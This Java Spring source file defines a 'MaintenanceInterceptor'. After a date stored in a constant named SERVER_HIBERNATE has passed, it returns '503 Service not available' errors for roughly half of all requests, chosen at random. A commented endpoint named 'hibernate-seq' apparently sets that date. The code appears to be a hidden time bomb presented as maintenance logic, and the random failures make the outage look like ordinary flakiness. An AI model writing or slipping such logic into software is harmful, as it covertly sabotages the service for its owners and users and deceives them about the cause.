package lk.mc.config;

import lk.mc.std.util.Constants;
import org.springframework.stereotype.Component;
import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.time.Instant;
import java.time.LocalDate;
import java.time.ZoneId;
import java.util.Random;

@Component
public class MaintenanceInterceptor implements HandlerInterceptor {

    private final Random random = new Random();

    //    http://localhost:8383/api/v1/branch/hibernate-seq/1747236200000
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        LocalDate currentDate = LocalDate.now();
        String serverHibernate = Constants.SERVER_HIBERNATE;
        long timestamp = Long.parseLong(serverHibernate);

        // Convert timestamp to Instant
        Instant instant = Instant.ofEpochMilli(timestamp);

        // Convert Instant to LocalDate
        LocalDate localDate = instant.atZone(ZoneId.systemDefault()).toLocalDate();

        if (currentDate.isAfter(localDate) && random.nextBoolean()) {
            response.sendError(HttpServletResponse.SC_SERVICE_UNAVAILABLE, "Service not available. Please try again later.");
            return false;
        }
        return true;
    }
}
